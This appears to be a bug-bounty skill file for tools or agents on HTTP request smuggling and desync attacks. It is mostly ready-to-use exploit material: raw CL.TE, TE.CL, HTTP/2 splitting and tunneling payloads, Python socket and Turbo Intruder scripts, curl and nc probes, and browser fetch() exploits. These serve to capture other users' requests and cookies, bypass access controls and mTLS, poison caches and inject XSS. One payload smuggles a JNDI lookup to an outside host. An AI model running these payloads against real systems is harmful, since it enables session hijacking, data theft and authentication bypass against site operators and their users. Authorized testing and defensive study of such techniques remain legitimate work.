---
name: "http-request-smuggling"
version: "3.0"
category: "api"
subcategory: "smuggling"
phase: "exploitation"
tags: ["bug-bounty", "smuggling", "desync", "cl-te", "te-cl", "te-te", "h2c", "cache-poisoning", "cache-deception", "request-smuggling", "cl0", "h2-smuggling", "request-splitting", "request-tunneling", "response-queue-poisoning", "crlf", "csd", "pause-desync", "mtls-bypass"]
tools: ["turbo-intruder", "h2csmuggler", "smuggler", "burp-repeater", "burp-intruder", "h2spec"]
follow_up_skills: ["http-header-injection", "crlf-injection", "cors-misconfiguration", "xss", "cache-poisoning-deception", "sqli", "api-fuzzing", "open-redirect"]
description: "Bug bounty skill: http request smuggling - exploitation phase, api category"
---
# HTTP Request Smuggling / HTTP Desync Attack

## Summary

HTTP Request Smuggling occurs when a desynchronization between front-end proxies (load balancers, reverse proxies) and the back-end server allows an attacker to send an HTTP request that is interpreted as a single request by the front-end but as two requests by the back-end. This enables request hijacking, cache poisoning, cache deception, security control bypass, and XSS exploitation without user interaction.

## Key Concepts

- **CL.TE**: Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`
- **TE.CL**: Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`
- **TE.TE**: Both use `Transfer-Encoding` but one can be induced to ignore it via obfuscation
- **H2.CL / H2.TE**: Conflicts between HTTP/2 body length signaling and HTTP/1 backends during downgrade
- **RFC 2616**: If both `Content-Length` and `Transfer-Encoding` are present, `Transfer-Encoding` must be honored (but implementations differ)
- **Smuggled prefix**: The bytes after the legitimate request that the back-end interprets as the start of the next request
- **On-site redirect to open redirect**: When a server redirects using the `Host` header value, smuggling a request with a malicious `Host` turns it into an open redirect
- **Client-Side Desync (CSD)**: Browser-side connection pool poisoning where a crafted response causes subsequent requests from the same browser to be hijacked
- **CL.0**: Back-end ignores `Content-Length` entirely (treats every request as zero-length body), so a request body becomes the next request — no header tampering needed
- **HTTP/2 Request Splitting**: Inject `\r\n` + full request into an HTTP/2 header value; after downgrade to HTTP/1 the back-end splits one request into two complete requests
- **HTTP/2 Request Tunneling**: When smuggling isn't possible, use H2 downgrade to fold internal headers into a body parameter (blind) or leak response bytes via HEAD's Content-Length over-read (non-blind)
- **Response Queue Poisoning**: Smuggle a *complete* request so the back-end emits an extra response the front-end queues; subsequent users receive responses intended for someone else
- **H2C Upgrade**: Cleartext HTTP/2 upgrade paths mishandled by intermediaries
- **mTLS header trust**: Front-ends add headers like `X-SSL-CLIENT-CN`; a smuggled request can inject a forged value the back-end trusts for client authentication

## High-Value Targets

- Front-end security controls (authentication bypass via desync)
- Endpoints shared by many users (high-traffic APIs, chat, feeds)
- Request capture endpoints (search, logging, analytics)
- Session-sensitive endpoints (auth callbacks, account settings)
- Internal admin interfaces proxied through the same connection pool

## Technical Details

### Request Anatomy

- **`\r\n`** — HTTP newline (2 bytes)
- **`Content-Length`**: Decimal byte count of the body; no trailing newline required
- **`Transfer-Encoding: chunked`**: Hex byte count per chunk; chunk must end with `\r\n`; terminates with `0\r\n\r\n`

### CL.TE Desync

Front-end uses `Content-Length`; back-end uses `Transfer-Encoding`.

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

The front-end forwards all 30 bytes (the entire request). The back-end processes the chunked body — the `0` ends the chunks — then treats `GET /404 HTTP/1.1\r\nFoo: x` as the start of the **next** request. The next victim's request gets appended after `Foo: x`, causing a 404 response.

### TE.CL Desync

Front-end uses `Transfer-Encoding`; back-end uses `Content-Length`.

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0
```

The front-end reads the entire chunked body and forwards it. The back-end reads only 4 bytes (`7b\r\n`) per `Content-Length`, leaving `GET /404...` as the next request.

### TE.TE Desync (Header Obfuscation)

Both servers support `Transfer-Encoding`, but obfuscation causes one to ignore it:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Transfer-Encoding:\tchunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding\r\n: chunked
```

### Modern Desync Variants

#### H2.CL / H2.TE (HTTP/2 Downgrade)

When an HTTP/2 front-end downgrades to HTTP/1 back-end, inconsistencies in body length signaling can cause desync. HTTP/2 uses built-in framing (DATA frames with explicit length), but when translating to HTTP/1.1, the front-end may insert a `Content-Length` or `Transfer-Encoding` header that conflicts with how the back-end interprets the body.

Note: `content-length` is a regular HTTP/2 header — pseudo-headers are exclusively `:method`, `:path`, `:authority`, and `:scheme`. This means an attacker can inject a `content-length` header in the HTTP/2 request that conflicts with the actual body length.

```
:method: POST
:path: /
:authority: vulnerable-website.com
content-length: 0
content-length: 44

GET /admin HTTP/1.1
Host: vulnerable-website.com
```

#### H2C Upgrade Smuggling

H2C (cleartext HTTP/2) upgrade can be used to smuggle requests through intermediaries that don't fully support the upgrade:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__

GET /admin HTTP/1.1
Host: vulnerable-website.com
```

#### HTTP/3 Desync

HTTP/3 uses QUIC transport, introducing new desync opportunities when proxies translate between HTTP/3 and HTTP/1.1:

- Multiple streams in a single connection may be processed inconsistently
- Stream resets can leave partial data in backend queues
- QPACK header compression differences between implementations
- Duplicate headers in HTTP/3 may be interpreted differently by backends

Detection:
```bash
curl --http3 https://target.com/endpoint -v
curl -I https://target.com | grep -i alt-svc
```

#### Client-Side Desync (CSD)

Client-Side Desync exploits browser behavior to poison the browser's own connection pool, affecting subsequent requests from the same client:

1. Attacker crafts a response that the browser caches
2. Response includes smuggled request
3. Next victim request gets poisoned response

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 10

x=
GET /static/innocent.js HTTP/1.1
Host: vulnerable.com
```

The browser receives a response for `/static/innocent.js` that contains attacker-controlled content (injected JavaScript, etc.).

Key prerequisites:
- The server responds to a POST **without reading the body** (leaving the prefix on the socket)
- The server allows **connection reuse** for subsequent requests
- **HTTP/1.1 only** — HTTP/2's framing prevents this

Attack stages:
1. Victim visits a malicious page containing JS that sends a crafted request to the vulnerable server
2. The crafted request contains an attacker-controlled prefix in its body, left on the server socket after the response
3. JS triggers a follow-up request that is appended to the prefix — the server executes the smuggled request (e.g., `GET /hopefully404`)

Step-by-step workflow (Burp → browser):
1. **Probe in Burp**: send a request with `Content-Length` longer than the actual body; an immediate response suggests a CSD vector.
2. **Confirm in Burp**: send two requests down the same connection; check if the first request's body affects the second's response.
3. **PoC in browser** with `fetch()`:

```javascript
fetch('https://vulnerable-website.com/vulnerable-endpoint', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://vulnerable-website.com/'
})
```

4. **Handle redirects**: use `mode: 'cors'` to prevent the browser from following redirects:

```javascript
fetch('https://vulnerable-website.com/redirect-me', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    location = 'https://vulnerable-website.com/'
})
```

5. **Find an exploitable gadget**, refine the exploit in Burp, then replicate in the browser.

CSD exploitation goals:
- **Client-side cache poisoning**: poison the browser's cache with a redirect, then trigger the resource import:

```html
<script>
    fetch('https://vulnerable-website.com/desync-vector', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\r\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() => {
        location = 'https://vulnerable-website.com/resources/target.js'
    })
</script>
```

- **Polyglot payload** that works as both HTML and JavaScript for the poisoned resource:

```html
alert(1);
/*
<script>
    fetch( ... )
</script>
*/
```

- **Pivot against internal infrastructure**: the victim's browser sends requests to other sites the victim can access — e.g., smuggle a `User-Agent` containing a Log4Shell/JNDI payload to hit an internal log-parsing service:

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

High-value CSD targets:
- JavaScript files (cached and executed)
- CSS files (for exfiltration via background-image)
- JSON API responses (manipulate application state)

#### WebSocket Desync

WebSocket upgrade process can be vulnerable to request smuggling when the front-end and back-end handle the upgrade differently:

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /chat HTTP/1.1
Host: vulnerable.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: attacker-injection

```

Testing steps:
1. Initiate WebSocket upgrade with smuggling payload
2. Monitor if backend processes smuggled HTTP request
3. Check WebSocket frames for injected content
4. Test multiple simultaneous upgrade requests

#### Response Queue Poisoning

On pipelined connections, cause a misaligned response to be delivered to the wrong user (HTTP/1.1 response queue poisoning). Used to deliver attacker-controlled content or steal another user's response. Impact is typically catastrophic: the attacker captures other users' responses (session tokens, PII) and other users get random responses.

Three criteria for a successful attack:
1. **Connection reuse** — the front-end↔back-end TCP connection is reused across request/response cycles
2. **Smuggle a complete, standalone request** that receives a distinct back-end response (not just a prefix)
3. **Maintain the connection** — the attack must not cause either server to close the TCP connection (avoid invalid requests)

**Smuggling a prefix vs a complete request:**

Smuggling only a prefix (a request with a body whose `Content-Length` swallows the next request) makes the back-end see 3 requests where the third is leftover bytes — usually an error that closes the connection. To poison the queue you must smuggle a **complete request**:

```
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

The front-end believes it forwarded a single request; the back-end sees two and sends two responses. The front-end maps the first response correctly and holds the second in a queue. Each subsequent request consumes one queued response, so the attacker can issue arbitrary follow-ups (e.g., with Burp Intruder) to harvest responses intended for other users.

Pro tips:
- Use a non-existent path (`GET /anything`) in both requests so your own requests consistently receive a 404 — any non-404 response is a stolen one.
- The connection is typically reset after ~100 requests (common default); simply re-poison a new connection when it closes.
- You can't control *which* responses you capture — you always get the next response in the queue.

#### Request Tunneling via CONNECT

The CONNECT method can be abused for request smuggling through forward proxies:

```
CONNECT internal.service:80 HTTP/1.1
Host: vulnerable-proxy.com

GET /admin HTTP/1.1
Host: internal.service
Authorization: Bearer stolen_token
```

#### Pause-Based Desync

Exploiting TCP flow control and timing to cause inconsistent parsing. Mechanism: the front-end forwards bytes to the back-end as they arrive; if the back-end times out waiting for the rest of the request but leaves the connection open, the front-end may continue using that connection — poisoning it with subsequent data.

Server-side pause-based desync:
1. Send headers, then **pause before sending the body**.
2. The back-end times out waiting for the body but sends a response.
3. Send the remaining body — the front-end sees it as a continuation of the initial request; the back-end sees it as a new request.

```python
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('vulnerable.com', 80))

s.send(b'POST / HTTP/1.1\r\n')
time.sleep(2)
s.send(b'Host: vulnerable.com\r\n')
time.sleep(2)
s.send(b'Content-Length: 50\r\n')
s.send(b'Transfer-Encoding: chunked\r\n\r\n')

s.send(b'0\r\n\r\nGET /admin HTTP/1.1\r\n')
s.send(b'Host: vulnerable.com\r\n\r\n')
```

Turbo Intruder variant using `pauseMarker`/`pauseTime` (single connection, keep-alive, 60s pause at the `\r\n\r\n` marker):

```python
from turbo_intruder import RequestEngine, Engine

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)
    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
    followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n'
    engine.queue(followUp)

def handleResponse(req, interesting):
    table.add(req)
```

Client-side pause-based desync: browsers cannot pause mid-request, so an **active MITM** is required — delay specific TCP packets (identify and delay the final packet to induce a server timeout). Inject JS on a malicious site to issue requests to the target, and pad the request to control how packets are split for precise delays.

#### CL.0 Request Smuggling

The back-end server ignores the `Content-Length` header entirely, treating every request as if it had a body length of 0. No header tampering is required — a normal POST whose body contains a partial request creates the desync. Prime candidates: endpoints not expecting POST bodies, server-level redirects, and static file requests.

Detection:
1. Send a POST whose body contains a partial request, then a normal follow-up over the same connection.
2. If the follow-up's response is affected (e.g., a 404 to `/`), CL.0 is confirmed.

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
GET / HTTP/1.1
Host: vulnerable-website.com
```

Testing in Burp Suite:
1. Create one tab with the setup request and another with the follow-up request.
2. Group the tabs in the correct order.
3. Change send mode to "Send group in sequence (single connection)".
4. Ensure `Connection: keep-alive`.
5. Send and analyze — a 404 response to the follow-up indicates a smuggled request.

Eliciting CL.0 behavior when no obvious endpoint is vulnerable:
- **Trigger a server error**: when request headers trigger an error, some servers respond without consuming the body; if the connection stays open this is a CL.0 vector.
- **Obfuscate `Content-Length`** in GET requests — if the back-end misses the obfuscated header while the front-end sees it, desync follows (reuse TE.TE-style obfuscation on CL).

#### HTTP/2 Vectors Unique to HTTP/2

HTTP/2's binary framing permits vectors impossible in HTTP/1 (which can't contain certain bytes in header names/values). These all target the HTTP/2 → HTTP/1 downgrade.

**Injecting via header names**: an HTTP/2 header *name* may contain `:` and `\r\n`, which after downgrade become separate HTTP/1 headers, bypassing front-end filters:

```
# H2 header name field:
foo: bar\r\nTransfer-Encoding: chunked\r\nX: ignore
# becomes H1:
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```

**Injecting via pseudo-headers**: include a regular `Host` header alongside `:authority` to produce two Host headers after downgrade (ambiguous host, may bypass front-end filters). Duplicate `:path` pseudo-headers give two distinct paths — if access controls validate one and routing uses another, restricted endpoints are reachable:

```
:method   POST
:path     /anything
:path     /admin
:authority vulnerable-website.com
```

**Injecting a full request line**: if spaces are allowed in `:method`, inject an entire request line:

```
:method  GET /admin HTTP/1.1
:path    /anything
:authority vulnerable-website.com
# downgrades to:
GET /admin HTTP/1.1 /anything HTTP/1.1
Host: vulnerable-website.com
```

**Injecting a URL prefix via `:scheme`**: arbitrary `:scheme` values manipulate the generated URL, poisoning redirects:

```
:method  GET
:path    /anything
:authority vulnerable-website.com
:scheme  https://evil-user.net/poison?
# 301 response location:
https://evil-user.net/poison?://vulnerable-website.com/anything/
```

**Injecting newlines into pseudo-headers**: keep the H1 request line valid, then inject `\r\n` to add arbitrary headers:

```
:method  GET
:path    /example HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX: x
:authority vulnerable-website.com
```

**CRLF injection in header values**: since H2 doesn't use delimiters, `foo: bar\r\nTransfer-Encoding: chunked` in an H2 header value splits into two H1 headers on downgrade — bypasses front-end CL validation / TE stripping.

#### HTTP/2 Request Splitting

Split a single HTTP/2 request into two complete requests at the back-end by injecting data in the *headers* rather than the body. Works with GET (which normally has no body) and avoids back-end `Content-Length` validation:

```
:method   GET
:path     /
:authority vulnerable-website.com
foo

bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

**Accounting for front-end rewriting**: the front-end usually appends a new `Host` header at the *end* of the header list during downgrade (converting `:authority`). If the request splits after that point, the first part lacks a Host and the second has two. Inject your own `Host` *before* the split point so both parts are valid:

```
:method   GET
:path     /
:authority vulnerable-website.com
foo

bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```

#### HTTP/2 Request Tunneling

When traditional smuggling is blocked (strict connection reuse), H2 downgrade can trick the front-end into appending internal headers into what becomes a *body parameter* on the back-end — and optionally leak the tunneled response.

**Leaking internal headers (blind):** inject `\r\n\r\n` inside a header value so the front-end treats everything as one header while the back-end sees headers + body:

```
:method      POST
:path        /comment
:authority   vulnerable-website.com
content-type application/x-www-form-urlencoded
foo

bar\r\n
Content-Length: 200\r\n
\r\n
comment=
x=1
# Back-end receives:
# POST /comment HTTP/1.1
# ... Content-Length: 200
# comment=X-Internal-Header: secretContent-Length: 3
# x=1
```

Blind vs non-blind:
- **Blind**: some front-ends read only `Content-Length` bytes from the back-end, so the tunneled response is invisible to the attacker.
- **Non-blind via HEAD**: responses to HEAD include a `Content-Length` header with no body, so the front-end over-reads and leaks bytes of the tunneled response's body. The `Content-Length` of the HEAD response must be balanced with the tunneled response length:
  - Resource shorter than tunneled response → truncated leak
  - Resource longer → front-end waits and times out
  - Fixes: point the HEAD at endpoints returning the required length; inject reflected padding in the HEAD request to adjust its Content-Length; pad the tunneled response to match.

```
# Request
:method  HEAD
:path    /example
:authority vulnerable-website.com
foo

bar\r\n
\r\n
GET /tunnelled HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
X: x
# Response leaks tunneled body after the HEAD headers
```

**High-severity usage**: mix headers from one response with the body of another (the tunneled response inherits the outer response's headers) to do web cache poisoning or reflected XSS in a context where the browser would not normally execute the code (e.g., JSON body served as `text/html`).

#### Header Oversizing

Exploit differences in maximum header sizes between front-end and back-end:

```
POST / HTTP/1.1
Host: vulnerable.com
X-Padding: AAAA[... 8KB of data ...]
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

If the front-end accepts larger headers than the back-end, the back-end may miss headers after its cutoff point.

## Methodology

1. **Architecture reconnaissance** — Identify multi-server architectures with proxies, load balancers, or CDNs. Target systems using Nginx, HAProxy, Varnish, Amazon ALB/CloudFront. Check for HTTP/2 support with HTTP/1 backend compatibility.

2. **Identify suspect endpoints** — Focus on endpoints that use both `Content-Length` and `Transfer-Encoding`. Look for features involving file uploads, API endpoints, and POST forms.

3. **Test with timing probes** — Send CL.TE probe (`Content-Length: 4`, chunked body with `1\r\nA\r\n0\r\n\r\n`). A timeout or delay indicates CL.TE. Send TE.CL probe (`Content-Length: 6`, chunked body with `0\r\nX\r\n`). A timeout indicates TE.CL. Use multiple connections with artificial delays between requests to detect queue interference.

4. **Confirm by poisoning your own requests** — Smuggle a `GET /404 HTTP/1.1` prefix. If a subsequent request to `/` returns a 404, the desync is confirmed. Use separate connections for attack and victim requests. For TE.TE, try various obfuscation techniques with the `Transfer-Encoding` header.

5. **Test HTTP/2 downgrade desync** — If the target supports HTTP/2, test H2.CL and H2.TE patterns using duplicate `content-length` headers or mixed pseudo-headers. Use tools like h2csmuggler to test h2c upgrade paths.

6. **Test modern desync variants** — Based on architecture:
   - **WebSocket**: Initiate upgrade with smuggled payload; check if backend processes smuggled HTTP request
   - **CSD**: Probe with `Content-Length` > body (immediate response = vector), confirm over a single connection, then build a `fetch()` PoC; check for cache hits (`Age`, `X-Cache` headers)
   - **CL.0**: POST a body containing a partial request (`GET /hopefully404`) then a follow-up over the same connection; a 404 to the follow-up confirms CL.0. Try endpoints that don't expect POST bodies, server-level redirects, static file handlers
   - **CONNECT tunneling**: Test if forward proxy forwards smuggled requests to internal services
   - **Pause-based**: Use raw socket connections with timing delays between header sends, or Turbo Intruder `pauseMarker`/`pauseTime`
   - **Header oversizing**: Send large padding headers to exceed backend size limits
   - **HTTP/3**: Check `Alt-Svc` headers indicating HTTP/3 support; test QUIC stream manipulation

7. **Map front-end request rewriting** — Find a POST parameter whose value is reflected in the response. Use the smuggled request to append the next request's headers into that reflected parameter. Start with a small `Content-Length` and increase until you see all the rewritten headers (e.g., `X-Forwarded-For`, `X-TLS-*`, `x-nr-external-service`). If `Content-Length` is too short, only part of the rewritten request arrives; too long and the server times out. Once revealed, mimic the rewritten headers in smuggled requests so the back-end processes them correctly.

8. **Test HTTP/2-unique vectors** — If the site supports HTTP/2, switch Burp Repeater to HTTP/2 (Request Attributes in the Inspector panel) and test: duplicate `:path` (ambiguous path), `Host` alongside `:authority` (ambiguous host), spaces in `:method` (full request line injection), `:scheme` URL prefix injection, CRLF/colon in header *names*, CRLF in header *values* (request splitting, tunneling), and `transfer-encoding: chunked` in H2 (H2.TE).

9. **Exploit** — Depending on the goal:
   - **Bypass security controls**: Smuggle a request to a restricted endpoint (`/admin`) with `Host: localhost`
   - **Bypass client authentication (mTLS)**: Smuggle a forged `X-SSL-CLIENT-CN` (or similar) header the back-end trusts, e.g., `X-SSL-CLIENT-CN: administrator`
   - **Capture other users' requests**: Smuggle a POST to a comment/feedback form that stores the appended data publicly
   - **Exploit reflected XSS**: Smuggle a request with XSS in a header (e.g., `User-Agent`) that gets reflected in the response
   - **Turn on-site redirect into open redirect**: Smuggle a request to a path that triggers a redirect using the `Host` header; use a protocol-relative path (`GET //attacker.com/example`) to turn even root-relative redirects into open redirects
   - **Cache poisoning**: Combine the open redirect with cache to serve attacker-controlled JS from a trusted URL
   - **Cache deception**: Smuggle a request for private data (`/private/messages`) and have it cached as a static resource
   - **CSD**: Poison cached JS/CSS/JSON responses to affect all subsequent visitors; use polyglot payloads and pivot to internal infra via the victim's browser
   - **WebSocket smuggling**: Hijack WebSocket connections for real-time data exfiltration
   - **Response queue poisoning**: Smuggle a complete request to desync the response queue, then harvest other users' responses with Intruder
   - **HTTP/2 request tunneling**: Leak internal headers into a body parameter (blind) or leak tunneled response bytes via HEAD (non-blind); chain into cache poisoning or XSS context-switch

10. **Document impact** — Demonstrate real security implications (session hijacking, data exposure, cache poisoning, account takeover).

## Detection Commands

### Basic Timing Probes

```bash
# CL.TE timing probe
curl -k -H "Transfer-Encoding: chunked" -H "Content-Length: 4" \
  -d $'1\r\nA\r\n0\r\n\r\n' \
  "https://target.com/" -m 10

# TE.CL timing probe (Content-Length > actual body → back-end waits for missing bytes)
curl -k -H "Transfer-Encoding: chunked" -H "Content-Length: 6" \
  -d $'0\r\nX\r\n' \
  "https://target.com/" -m 10
# NOTE: Setting Content-Length less than the body causes socket poisoning
# (differential-response detection), not a timeout.

# Confirmation - poison next request to 404 (CL.TE)
curl -k -H "Transfer-Encoding: chunked" -H "Content-Length: 30" \
  -H "Connection: keep-alive" \
  -d $'0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x\r\n\r\n' \
  "https://target.com/"
# Then immediately send a normal request in a new connection
curl -k "https://target.com/"
```

### HTTP/3 Detection

```bash
curl --http3 https://target.com/endpoint -v
curl -I https://target.com | grep -i alt-svc
```

### H2C Smuggling Detection

```bash
# Using h2csmuggler
go run ./cmd/h2csmuggler check https://target.com/ http://localhost
```

### Pause-Based Detection (Python)

```python
import socket, time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('target.com', 80))
s.send(b'POST / HTTP/1.1\r\n')
time.sleep(2)
s.send(b'Host: target.com\r\n')
time.sleep(2)
s.send(b'Content-Length: 50\r\n')
s.send(b'Transfer-Encoding: chunked\r\n\r\n')
s.send(b'0\r\n\r\nGET /404 HTTP/1.1\r\n')
s.send(b'Host: target.com\r\n\r\n')
print(s.recv(4096))
```

### CL.0 Detection

Send a POST whose body contains a partial request, immediately followed by a normal request over the **same connection** (`Connection: keep-alive`). A 404 to the follow-up indicates CL.0:

```bash
# Setup request (body contains smuggled prefix)
printf 'POST /vulnerable-endpoint HTTP/1.1\r\nHost: target.com\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\n\r\nGET /hopefully404 HTTP/1.1\r\nFoo: x\r\nGET / HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80
```

In Burp Suite: put the setup request and follow-up in a tab group, set send mode to "Send group in sequence (single connection)", keep `Connection: keep-alive`, and check whether the follow-up receives a 404.

## Validation

- Show a timing differential of 10+ seconds on the CL.TE or TE.CL probe and explain the mechanism
- Demonstrate a bypass: smuggle a request to `/admin` and receive a 200 response where a direct request returns 403
- For capture: show a subsequent user's Cookie or Authorization header appearing in the response of a controlled endpoint
- Confirm with a unique marker string in the smuggled prefix to rule out timing noise
- Provide the exact raw bytes of the smuggled request

## Exploitation Payloads

### CL.TE — Bypass Front-end Access Controls

```
POST / HTTP/1.1
Host: target.com
Cookie: session=...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

### TE.CL — Bypass Front-end Access Controls

```
POST / HTTP/1.1
Host: target.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

2b
GET /admin HTTP/1.1
Host: localhost
a=x
0
```

### CL.TE — Capture Other Users' Requests

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=...
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

csrf=TOKEN&postId=4&name=ATK&email=a%40a.com&comment=
```

The next user's request is appended to `comment=` and saved publicly.

### CL.TE — Exploit Reflected XSS in Headers

```
POST / HTTP/1.1
Host: target.com
Cookie: session=...
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213

0

GET /post?postId=2 HTTP/1.1
Host: target.com
User-Agent: "><script>alert(1)</script>
Content-Length: 10

A=
```

### CL.TE — On-Site Redirect to Open Redirect

```
POST / HTTP/1.1
Host: target.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker.com
Foo: X
```

### CL.TE — Cache Poisoning (Open Redirect + Cache)

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.com
Content-Length: 10

x=1
```

### CL.TE — Cache Deception

```
POST / HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

### Revealing Front-End Rewriting

```
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```

### H2C Upgrade Smuggling

```
GET / HTTP/1.1
Host: vulnerable.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__

GET /admin HTTP/1.1
Host: vulnerable.com
```

### WebSocket Upgrade Smuggling

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /chat HTTP/1.1
Host: vulnerable.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

```

### CONNECT Tunneling

```
CONNECT internal.service:80 HTTP/1.1
Host: vulnerable-proxy.com

GET /admin HTTP/1.1
Host: internal.service
```

### Client-Side Desync (CSD)

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Content-Length: 10

x=
GET /static/innocent.js HTTP/1.1
Host: vulnerable.com
```

### CL.0 — Smuggled Prefix via POST Body

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

### CL.TE — Bypass Client Authentication (mTLS Header Trust)

```
POST /example HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```

Front-ends normally overwrite auth headers added for mutual TLS (e.g., `X-SSL-CLIENT-CN`), but smuggled requests bypass that — the back-end trusts the forged CN and grants access.

### CL.TE — Root-Relative Redirect to Open Redirect

If a 301 uses a root-relative path (`Location: /example/`), smuggle a request with a **protocol-relative path** to force an off-site redirect:

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET //attacker-website.com/example HTTP/1.1
Foo: X
```

The server constructs `Location: //attacker-website.com/example/`, which browsers resolve as `https://attacker-website.com/example/`.

### H2.CL — Smuggling with Victim-Header Truncation

When the victim's appended headers would cause duplicate-header errors, include a trailing parameter and a `Content-Length` slightly longer than the body so the victim's request is truncated *before* its headers:

```
# HTTP/2 front-end sees:
:method        POST
:path          /example
:authority     vulnerable-website.com
content-type   application/x-www-form-urlencoded
content-length 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

### H2.TE — Transfer-Encoding in HTTP/2

The spec says front-ends must strip or block `transfer-encoding: chunked` in HTTP/2; if they don't, the downgraded request reaches a chunked-supporting back-end:

```
# HTTP/2 front-end sees:
:method            POST
:path              /example
:authority         vulnerable-website.com
transfer-encoding  chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

### HTTP/2 Request Splitting

Split a single H2 request into two complete H1 requests via header injection (works with GET, avoids CL validation). Inject a `Host` before the split point to survive front-end Host rewriting:

```
:method   GET
:path     /
:authority vulnerable-website.com
foo

bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```

